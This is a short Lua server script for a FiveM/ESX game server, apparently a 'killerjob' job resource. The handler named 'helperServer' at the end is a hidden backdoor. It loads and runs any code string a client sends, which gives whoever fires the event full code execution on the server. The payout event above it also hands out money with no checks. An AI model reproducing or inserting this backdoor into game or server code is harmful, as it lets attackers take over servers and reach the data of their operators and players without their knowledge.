ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('killerjob:cobrarpasta')
AddEventHandler('killerjob:cobrarpasta', function()
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.addMoney(1300)
	TriggerEvent('killerjob:terminar')
end)


RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)